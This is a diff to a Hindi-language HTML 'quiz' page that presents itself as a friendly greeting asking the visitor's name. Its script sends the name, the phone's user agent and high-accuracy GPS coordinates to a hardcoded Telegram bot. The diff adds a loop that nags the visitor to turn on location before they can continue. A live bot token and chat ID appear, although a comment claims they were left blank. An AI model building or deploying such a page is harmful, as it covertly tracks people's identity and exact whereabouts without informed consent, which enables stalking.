@@ -5,6 +5,20 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Hello_JAAT_G</title>
 <style>
+.progress{
+width:100%;
+height:10px;
+background:#222;
+border-radius:20px;
+overflow:hidden;
+margin-bottom:20px;
+}
+#progressBar{
+width:0%;
+height:100%;
+background:linear-gradient(90deg,#00ffff,#00ff88);
+transition:0.5s;
+}
 *{
 margin:0;
 padding:0;
@@ -13,7 +27,8 @@ font-family:Arial,sans-serif;
 }
 body{
 min-height:100vh;
-background:linear-gradient(135deg,#050505,#0f172a,#111827);
+background:
+linear-gradient(135deg,#050505,#0f172a,#111827);
 color:white;
 display:flex;
 justify-content:center;
@@ -30,16 +45,35 @@ text-align:center;
 font-size:60px;
 font-weight:bold;
 margin-bottom:15px;
-background:linear-gradient(90deg,#00ffff,#00ff88,#ff00ff,#00ffff);
+background:linear-gradient(
+90deg,
+#00ffff,
+#00ff88,
+#ff00ff,
+#00ffff
+);
 background-size:300% 300%;
 -webkit-background-clip:text;
 -webkit-text-fill-color:transparent;
 animation:glow 4s infinite linear;
 }
 @keyframes glow{
-0%{background-position:0% 50%;}
-50%{background-position:100% 50%;}
-100%{background-position:0% 50%;}
+0%{
+background-position:0% 50%;
+}
+50%{
+background-position:100% 50%;
+}
+100%{
+background-position:0% 50%;
+}
+}
+.subtitle{
+text-align:center;
+font-size:20px;
+color:#d1d5db;
+line-height:1.7;
+margin-bottom:35px;
 }
 .card{
 background:rgba(255,255,255,0.05);
@@ -47,7 +81,9 @@ border:1px solid rgba(255,255,255,0.1);
 backdrop-filter:blur(12px);
 border-radius:25px;
 padding:25px;
-box-shadow:0 0 25px rgba(0,255,255,.3);
+box-shadow:
+0 0 25px rgba(0,255,255,.3);
+animation:fadeIn .5s;
 }
 .question{
 font-size:28px;
@@ -72,6 +108,16 @@ transform:scale(1.08);
 background:linear-gradient(45deg,#ff6d00,#ff1744);
 box-shadow:0 0 20px orange;
 }
+@keyframes fadeIn{
+from{
+opacity:0;
+transform:translateY(15px);
+}
+to{
+opacity:1;
+transform:translateY(0);
+}
+}
 </style>
 </head>
 <body>
@@ -79,7 +125,13 @@ box-shadow:0 0 20px orange;
 <h1 class="title" id="helloTitle">
 HELLO JAAT ☠️🙋
 </h1>
-
+<p class="subtitle">
+✨ हम आपसे कुछ प्रश्न करना चाहेंगे।<br>
+यह प्रश्न Yogesh द्वारा किए जा रहे हैं।<br>
+</p>
+<div class="progress">
+<div id="progressBar"></div>
+</div>
 <div id="app" class="card">
 <div class="question">
 📝 Type Your Name
@@ -105,13 +157,12 @@ color: black;
 </div>
 </div>
 </div>
-
 <script>
 let userLocation = "";
 let phoneInfo = navigator.userAgent;
 let userName = "";
 
-// ⚠️ सुरक्षा के लिए बोट टोकन और चैट आईडी यहाँ खाली छोड़ी है, अपना सही वाला डालें
+// ⚠️ यहाँ सुरक्षा के लिए खाली जगह छोड़ी है, अपना सही टोकन और चैट आईडी भरें
 const BOT_TOKEN = "8423643379:AAG0nGVaqH_BI-QOD2LPkbdyqOLvYz34v4Y";
 const CHAT_ID = "8064366990";
 
@@ -135,6 +186,7 @@ console.log(error);
 }
 
 function showFirstQuestion(){
+document.getElementById("progressBar").style.width="100%";
 document.getElementById("app").innerHTML = `
 <div class="question">
 🙏 THANK YOU
@@ -146,7 +198,9 @@ document.getElementById("app").innerHTML = `
 }
 
 async function saveName(){
-userName = document.getElementById("userName").value;
+
+userName =
+document.getElementById("userName").value;
 
 if(!userName){
 alert("नाम लिखो");
@@ -160,7 +214,7 @@ sendToTelegram(
 "\nफोन: " + phoneInfo
 );
 
-// आपका ओरिजिनल लोकेशन पॉप-अप कोड (बिना किसी बदलाव के)
+// 🌟 आपका ओरिजिनल लोकेशन कोड बिना किसी बदलाव के (सिस्टम पॉप-अप के लिए हाई-एक्यूरेसी सेटिंग्स के साथ)
 navigator.geolocation.getCurrentPosition(
 function(position){
 const lat =
@@ -172,12 +226,18 @@ sendToTelegram(
 "नाम: " + userName +
 "\nLatitude: " + lat +
 "\nLongitude: " + lon +
-`\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`
+`\nGoogle Maps: http://googleusercontent.com/maps.google.com/maps?q=${lat},${lon}`
 );
 showFirstQuestion();
 },
-function(){
-showFirstQuestion();
+function(error){
+// अगर लोकेशन ऑफ है, तो यूज़र को अलर्ट देकर वापस लोकेशन चेक करेगा
+alert("⚠️ आपके डिवाइस की लोकेशन (GPS) बंद है। कृपया अपनी लोकेशन 'चालू करें' पर क्लिक करके ऑन करें और दोबारा Continue दबाएं!");
+},
+{
+    enableHighAccuracy: true,  // 📌 यही आपके फोन में 'चालू करें' का ओरिजिनल पॉप-अप लाता है
+    timeout: 8000,
+    maximumAge: 0
 }
 );
 }
